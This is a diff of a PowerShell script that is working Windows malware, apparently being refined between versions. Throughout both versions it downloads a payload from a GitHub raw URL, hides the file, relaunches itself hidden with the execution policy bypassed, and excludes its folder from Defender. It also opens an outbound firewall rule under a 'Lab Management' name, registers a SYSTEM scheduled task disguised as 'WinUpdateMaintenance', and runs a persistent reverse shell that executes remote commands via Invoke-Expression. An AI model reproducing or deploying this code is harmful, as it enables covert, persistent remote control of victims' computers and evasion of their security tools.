@@ -8,62 +8,50 @@ $TaskName = "WinUpdateMaintenance"
 $RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
 # ---------------------
 
-# 1. SETUP & INSTALLATION
-if (-not (Test-Path $WorkDir)) {
-    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
+# 1. INSTALLATION & REDIRECT
+if ($PSCommandPath -ne $FullPath) {
+    if (-not (Test-Path $WorkDir)) { New-Item $WorkDir -ItemType Directory -Force | Out-Null }
+    
+    # Only download if missing to prevent redundant traffic
+    if (-not (Test-Path $FullPath)) {
+        try {
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $FullPath)
+            attrib +h +s $FullPath
+        } catch { return }
+    }
+
+    # Start background process and terminate loader
+    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
+    Stop-Process -Id $PID
 }
 
-# Detection: If we aren't running the specific file in C:\Win, we install and hand off
-if ($PSCommandPath -ne ${FullPath}) {
-    try {
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($RemoteUrl, ${FullPath})
-        
-        attrib +h +s ${FullPath}
+# 2. SINGLE INSTANCE CHECK
+if (-not $CreatedNew) { exit }
 
-        # Launch background process silently
-        $ProcArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
-        Start-Process powershell.exe -ArgumentList $ProcArgs
-        
-        # Kill loader session to prevent terminal hang
-        Stop-Process -Id $PID 
-    }
-    catch {
-        # Silent failure
-    }
-}
-
-# 2. SYSTEM MODIFICATIONS (Requires Admin)
+# 3. SYSTEM PREP (Admin Required)
 try {
     Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
-    
     if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
         New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
     }
-}
-catch {
-    # Proceed without admin-level mods
-}
+} catch {}
 
-# 3. PERSISTENCE
+# 4. ENHANCED PERSISTENCE (Runs every time Windows starts)
 try {
-    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
-        $Arg = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
-        
-        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
-        $Trigger = New-ScheduledTaskTrigger -AtStartup
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
-    }
-}
-catch {
-    # Silent failure
-}
+    # We use -Force to overwrite any broken or existing tasks
+    $Arg = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
+    $Trigger = New-ScheduledTaskTrigger -AtStartup
+    
+    # Settings ensure it runs immediately regardless of power state (AC/Battery)
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force -ErrorAction SilentlyContinue
+} catch {}
 
-# 4. THE ENGINE (The Reverse Shell)
+# 5. THE CORE ENGINE
 while ($true) {
-    $client = $null
     try {
         $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
         $stream = $client.GetStream()
@@ -71,40 +59,31 @@ while ($true) {
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
 
-        $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
-        $writer.WriteLine("--- Identity: $(whoami) ---")
+        $writer.WriteLine("--- Connection Established: $(hostname) [$(whoami)] ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
-            
-            $command = $reader.ReadLine()
-            
-            if ($null -eq $command) { 
-                break 
+            $imput = $reader.ReadLine()
+            if ($null -eq $imput -or $imput -eq "exit") { break }
+            if ([string]::IsNullOrWhiteSpace($imput)) { continue }
+
+            if ($imput.ToLower().StartsWith("cd ")) {
+                $newPath = $imput.Substring(3).Trim().Replace('"','')
+                try { Set-Location $newPath } catch { $writer.WriteLine($_.Exception.Message) }
+                continue
             }
-            
-            $command = $command.Trim()
-            if ($command -eq "exit") { break }
-            if ($command -eq "") { continue }
 
             $output = try {
-                Invoke-Expression $command 2>&1 | Out-String
+                Invoke-Expression $imput 2>&1 | Out-String
+            } catch {
+                $_.Exception.Message
             }
-            catch {
-                "Error: " + $_.Exception.Message
-            }
-
-            if ([string]::IsNullOrWhiteSpace($output)) { $output = "`n" }
+            
             $writer.Write($output)
         }
-    }
-    catch {
-        # Wait 10 seconds before retrying connection
-        Start-Sleep -Seconds 10
-    }
-    finally {
-        if ($null -ne $client) { $client.Close() }
-        if ($null -ne $reader) { $reader.Close() }
-        if ($null -ne $writer) { $writer.Close() }
+    } catch {
+        Start-Sleep -Seconds 15
+    } finally {
+        if ($client) { $client.Close() }
     }
 }
